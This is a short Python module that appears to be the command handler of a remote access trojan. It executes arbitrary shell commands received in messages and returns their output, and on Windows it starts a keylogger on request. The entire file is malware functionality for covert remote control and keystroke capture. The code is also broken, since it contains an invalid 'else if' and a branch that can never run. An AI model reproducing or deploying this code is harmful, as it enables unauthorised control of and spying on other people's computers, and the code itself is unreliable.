import subprocess
import addons
import os

if  os.name=="nt":
	os_type = "win"
else:
	os_type = "unix"

def distribute(messageSent):
	if messageSent.find ( 'cmd' ) != -1:
		return ExecCmd(messageSent.split(':')[1])
	if messageSent.find ( 'keylogger' ) != -1:
		if os_type == "win":
			return addons.keylogger.keylogger_win(10)
		else if os_type == "linux":
			return "404 - Request not found"
	else:
		return "404 - Request not found"


def ExecCmd(cmd):
	try :
		output =  subprocess.Popen(cmd, stdout=subprocess.PIPE,shell=True).communicate()[0]
		return output.replace("\r"," - ").replace("\n"," - ")
	except :
		output = "FAILED"
		return output